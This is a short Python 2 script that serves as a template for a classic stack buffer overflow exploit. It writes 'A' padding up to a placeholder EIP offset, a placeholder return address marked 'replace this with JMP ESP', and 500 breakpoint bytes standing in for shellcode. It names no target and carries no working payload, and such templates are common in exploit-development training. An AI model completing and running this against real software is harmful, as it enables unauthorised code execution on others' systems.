#!/usr/bin/python2

import os # for output setting
import sys 
import struct # for pack function

# turn off output buffer and set binary mode
sys.stdout = os.fdopen(sys.stdout.fileno(), 'wb', 0)

distance_to_eip = 0000  # replace this with distance to EIP
eip = 0x42424242        # replace this with JMP ESP

shellcode = "\xCC" * 500

buf = "A" * distance_to_eip
buf += struct.pack('<I', eip)
buf += shellcode

sys.stdout.write(buf)
